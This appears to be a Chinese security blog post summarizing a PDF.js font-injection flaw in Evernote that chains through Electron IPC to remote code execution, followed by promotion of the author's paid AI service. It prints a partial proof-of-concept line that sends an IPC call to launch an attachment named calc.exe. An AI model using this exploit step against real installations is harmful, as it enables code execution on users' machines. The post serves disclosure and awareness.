#  Evernote 应用中PDF.js字体注入导致跨平台远程代码执行漏洞   
原创 bggsec  甲方安全建设   2024-07-11 08:00  
  
## 前言  
>   
> 一句话总结(点击原文跳转)  
  
  
主要描述了一个在Evernote应用中发现的关键性漏洞，该漏洞可以通过嵌入恶意PDF文件到笔记中，利用PDF.js的字体注入进行JavaScript代码执行，进而通过Electron的ipcRenderer和BrokerBridge实现跨进程通信，最终达到远程代码执行（RCE）的攻击链。  
  
>   
> 关键信息点  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyOC2NydInFzOIicJEOlk2cjgnbkdlqQu2fZl2RwcSnS2x7SSuqJXTojg/640?wx_fmt=png&from=appmsg "")  
```
//部分poc
window.top.electronApi.ipcRenderer.send('BrokerBridge', {action: 'Bridge/Call',id: '7e803824-d666-4ffe-9ebb-39ac1bd7856f',topics: 'boron.actions.openFileAttachment',data:{'resource': {'hash':'2f82623f9523c0d167862cad0eff6806','mime': 'application/octet-stream','rect': {'left': 68,'top': 155,'width': 728.1428833007812,'height': 43.42857360839844},'state': 'loaded','reference': '22cad1af-d431-4af6-b818-0e34f9ff150b','selected': true,'url': 'en-cache://tokenKey%3D%22AuthToken%3AUser%3A245946624%22+f4cbd0d2-f670-52a7-7ea7-5720d65614fd+2f82623f9523c0d167862cad0eff6806+https://www.evernote.com/shard/s708/res/54938bad-ecb2-3aaa-6ad0-a9b7958d402f','isInk': false,'filesize': 45056,'filename': 'calc.exe'},'url':'en-cache://tokenKey%3D%22AuthToken%3AUser%3A245946624%22+f4cbd0d2-f670-52a7-7ea7-5720d65614fd+2f82623f9523c0d167862cad0eff6806+https://www.evernote.com/shard/s708/res/54938bad-ecb2-3aaa-6ad0-a9b7958d402f','noteGuid': 'f4cbd0d2-f670-52a7-7ea7-5720d65614fd','appName': ''}})
```  
>   
> 某知名安全大V，昨日印象笔记被黑  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DynjEx8PW9cicEcNUawO9Hib7ETlRkB7luo8Ix8muek3EeG4paZU4LBMPw/640?wx_fmt=png&from=appmsg "")  
>   
> 延伸阅读  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DybaODOiaLVTcD8wUumHCJ7DZnnCT4EjT3TGGUicSicK616ibSEbmebmWMcw/640?wx_fmt=png&from=appmsg "")  
>   
> 最近的小玩意  
  
- AI重构安全热点  
  
- ![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyNUp02icA9baEZpASXH7LupChWE1dhlicc7dGU2WMt1BNiaPMcg7Tv0Z4A/640?wx_fmt=png&from=appmsg "")  
  
- Ai重构知识库+智能书签+导航  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyWGLFwfIgUdL5fVA6F33Eu0yic66ww0OczarsWtGoR3TLCNYVnXajCAg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyLaCfov9GGZA9cd6icIYuP5IKw4vs78vawr5Ex9T6p2KcDpuGLaGqmPw/640?wx_fmt=png&from=appmsg "")  
- 花费, 周均一亿多token  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyLoDJwXHiar1y4ibZjsxCMA43I7AU3MmgUMsy6eWyUdibY4VZ0ibVDsXAWw/640?wx_fmt=png&from=appmsg "")  
- 自动化输出方式(快讯星球+微博)  
  
```
部分能力后期会开放，比如知识库/迪斯科等，星球身份应该是后期各服务的通行证
AI目前比较贵，为了可持续发展，设置了星球的地板价25元(系统最低价)
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyssgvAvnnTufYJpqzek9hAYycEWzUP57qRkLa7Gf458C8E6PFf3khTg/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0Dyp64ZtycStwT7conLOibhhcQvhYuoapl9xPBCMP8icCbZvzvr222LJAng/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/icqm3vRUymZkDzC5njrov9XMbdIJSl0Dy1FFdGtVj8hagUkBUP6NBSQFj0YN4hgDfRTegalIlckxxLNI4DXJFuA/640?wx_fmt=jpeg&from=appmsg "")  
- 沟通群(过期添加red4blue,备注加群)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/icqm3vRUymZkDzC5njrov9XMbdIJSl0DyficsetRouXGwCnztEwb9kSNXUEtJmwdHTcojhqF7yiboxl2iaAMdFaGuw/640?wx_fmt=png&from=appmsg "")  
  
  
  
